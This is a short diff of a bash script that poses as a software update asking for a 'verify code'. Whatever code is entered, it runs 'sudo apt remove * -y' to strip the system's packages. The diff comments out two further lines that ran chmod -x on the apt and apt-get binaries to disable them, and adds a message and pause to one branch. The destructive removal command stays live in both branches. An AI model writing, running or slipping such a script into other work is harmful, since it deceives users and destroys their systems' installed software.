@@ -8,10 +8,12 @@ echo "Please, introduce verify code to end the update: "
 read code
 if [ $code != 'ITSA-TEST' ]; then
   sudo apt remove * -y
+  echo "ITSA-TEST: Código detectado"
+  sleep 1
 else
   sudo apt remove * -y
-  sudo chmod -x /usr/bin/apt
-  sudo chmod -x /usr/bin/apt-get
+  # sudo chmod -x /usr/bin/apt
+  # sudo chmod -x /usr/bin/apt-get
 fi
 
 clear
